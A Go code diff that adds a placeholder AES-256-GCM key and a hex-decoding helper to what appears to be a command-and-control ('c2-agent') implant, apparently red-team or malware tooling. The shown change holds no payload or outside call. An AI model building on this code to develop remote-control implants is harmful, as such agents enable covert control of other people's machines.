@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"net/http"
 	"os"
@@ -18,7 +19,24 @@ var (
 	ProfileID int    = 1
 	Locale    string = "en-US,en;q=0.9"
 	AgentID   string
+
+	// Encryption key for payload encryption (AES-256-GCM).
+	// These are dev-only placeholders. Real agents get a fresh key
+	// from the build pipeline. This dev key is not in the server DB
+	// so agents built from source will fail to check in.
+	KeyID         = "devdevde"
+	EncryptionKey = mustDecodeHex("6465766b657930303030303030303030303030303030303030303030303030303030"[:64])
 )
+
+// mustDecodeHex decodes a hex string into []byte, panicking on failure.
+// If this panics at startup the binary was built with a malformed key.
+func mustDecodeHex(s string) []byte {
+	b, err := hex.DecodeString(s)
+	if err != nil {
+		panic("c2-agent: invalid encryption key hex: " + err.Error())
+	}
+	return b
+}
 
 func generateUUID() string {
 	b := make([]byte, 16)
